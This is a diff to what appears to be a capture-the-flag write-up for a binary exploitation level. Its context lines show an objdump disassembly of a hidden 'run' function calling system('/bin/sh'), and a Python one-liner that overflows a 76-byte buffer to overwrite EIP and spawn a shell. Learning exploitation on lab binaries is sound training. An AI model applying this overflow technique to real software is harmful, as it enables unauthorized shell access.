@@ -6,7 +6,7 @@ Illegal instruction (core dumped)
 ```
 
 At this point, we know the buffer size which is equal to `76`. Now we try to decompile with `objdump -d ./level1` :
-```asm
+```nasm
 08048444 <run>:
  8048444:	55                   	push   %ebp
  8048445:	89 e5                	mov    %esp,%ebp
@@ -27,7 +27,7 @@ At this point, we know the buffer size which is equal to `76`. Now we try to dec
  804847f:	c3                   	ret 
 ```
 
-We see here a function which is not called by the `main` but execute a `system('/bin/sh')`. The idea is to place the `0x8048444` run's address in the bufferoverflow :
+We see here a function which is not called by the `main()` but execute a `system('/bin/sh')`. The idea is to place the `0x8048444` run's address in the bufferoverflow for overlap `EIP` :
 ```bash
 (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
 Good... Wait what?
